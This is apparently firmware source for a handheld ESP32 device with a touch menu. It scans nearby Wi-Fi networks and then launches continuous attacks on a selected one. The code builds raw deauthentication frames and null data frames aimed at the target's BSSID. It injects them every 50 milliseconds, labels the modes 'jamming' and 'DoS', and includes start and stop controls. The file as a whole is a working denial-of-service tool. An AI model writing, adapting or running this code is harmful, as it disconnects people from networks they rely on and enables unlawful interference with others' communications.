#include "wifi_page_library.h"

// ================== GLOBAL VARIABLES ==================
const char **wifi_button_texts = nullptr;
String *wifi_networks = nullptr;
int WIFI_BUTTON_COUNT = 0;
NetworkInfo targetNetwork;
int wifi_selected_index = -1;

lv_timer_t *wifi_attack_timer = nullptr;
bool is_jamming = false;
bool is_dos = false;

// ================== NETWORK SCANNING ==================
void scanNetworks() {
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    
    Serial.println("[*] Scanning for Wi-Fi networks...");
    int n = WiFi.scanNetworks();
    WIFI_BUTTON_COUNT = n;

    if (wifi_networks) delete[] wifi_networks;
    wifi_networks = new String[n];

    for (int i = 0; i < n; ++i) {
        wifi_networks[i] = WiFi.SSID(i);
    }
    //WiFi.scanDelete();
}

// ================== ATTACK PACKETS ==================

// Send one Deauth packet
static void send_deauth_packet() {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // Destination (broadcast)
        0,0,0,0,0,0,                      // Source (BSSID)
        0,0,0,0,0,0,                      // BSSID again
        0x00, 0x00, 0x07, 0x00
    };
    memcpy(&deauthPacket[10], targetNetwork.bssid, 6);
    memcpy(&deauthPacket[16], targetNetwork.bssid, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

// Send one Null Data packet
static void send_null_packet() {
    uint8_t nullPacket[24] = {
        0xC8, 0x00, 0x00, 0x00,
        0,0,0,0,0,0,  // Destination
        0,0,0,0,0,0,  // Source
        0,0,0,0,0,0,  // BSSID
        0x00, 0x00
    };
    memcpy(&nullPacket[4], targetNetwork.bssid, 6);
    memcpy(&nullPacket[10], targetNetwork.bssid, 6);
    memcpy(&nullPacket[16], targetNetwork.bssid, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, nullPacket, sizeof(nullPacket), false);
}

// ================== TIMER CALLBACK ==================

// Called every timer tick (e.g. every 50ms)
static void wifi_attack_timer_cb(lv_timer_t *timer) {
    if (is_jamming) {
        send_deauth_packet();
    } else if (is_dos) {
        send_null_packet();
    }
}

// ================== JAMMING ==================

// Start continuous jamming
void wifi_jamm() {
    Serial.println("[*] Starting Wi-Fi Jamming...");

    wifi_jamm_stop(); // Ensure no previous attack still running

    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);

    is_jamming = true;
    is_dos = false;

    wifi_attack_timer = lv_timer_create(wifi_attack_timer_cb, 50, NULL); // 50ms
}

// ================== DOS ATTACK ==================

// Start continuous DoS
void wifi_dos() {
    Serial.println("[*] Starting Wi-Fi DoS Attack...");

    wifi_jamm_stop(); // Ensure no previous attack still running

    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);

    is_jamming = false;
    is_dos = true;

    wifi_attack_timer = lv_timer_create(wifi_attack_timer_cb, 50, NULL); // 50ms
}

// ================== STOPPING ATTACK ==================

// Stop jamming/DoS
void wifi_jamm_stop() {
    if (wifi_attack_timer != nullptr) {
        lv_timer_del(wifi_attack_timer);
        wifi_attack_timer = nullptr;
    }

    is_jamming = false;
    is_dos = false;

    Serial.println("[*] Stopping Wi-Fi Attack...");
    
    esp_wifi_stop();
    WiFi.mode(WIFI_MODE_NULL);
    delay(100);
}